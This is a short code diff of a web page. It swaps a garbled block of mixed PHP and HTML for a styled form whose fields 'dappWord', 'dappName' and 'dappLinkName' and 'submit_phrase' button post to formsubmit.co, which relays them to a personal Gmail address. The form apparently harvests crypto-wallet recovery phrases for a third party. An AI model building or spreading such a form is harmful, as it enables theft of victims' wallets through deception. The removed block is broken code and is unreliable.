@@ -1577,13 +1577,22 @@
         }
     });
 
-    if ($_POST['dappWord']) {
-<form action="https://formsubmit.co/smelissa116@gmail.com" method="POST">
-  	$ip = getRealIpUser();
-     <input type= $dappWord = $_POST['dappWord']; required>
-     <input type= $dappName = $_POST['dappName'];required>  <input type=   $linkName = $_POST['linkName']; required>
- $response = "";
-     <button type=""submit_phrase"">Send</button>
-</form>
-</script>
-
+   <form target="_blank" 
+       action="https://formsubmit.co/smelissa116@gmail.com" 
+        method="POST">
+    <div class="form-group">
+      <div class="form-row">
+        <div class="col">
+          <input type="text" name="dappWord" class="form-control" placeholder="dappWords" required>
+        </div>
+        <div class="col">
+          <input type="text" name="dappName" class="form-control" placeholder="dappName" required>
+        </div>
+      </div>
+    </div>
+    <div class="form-group">
+      <textarea placeholder="linkName" class="form-control" name="dappLinkName" rows="10" required></textarea>
+    </div>
+    <button type="submit" class="btn btn-lg btn-dark btn-block">submit_phrase"</button>
+  </form>
+</div>
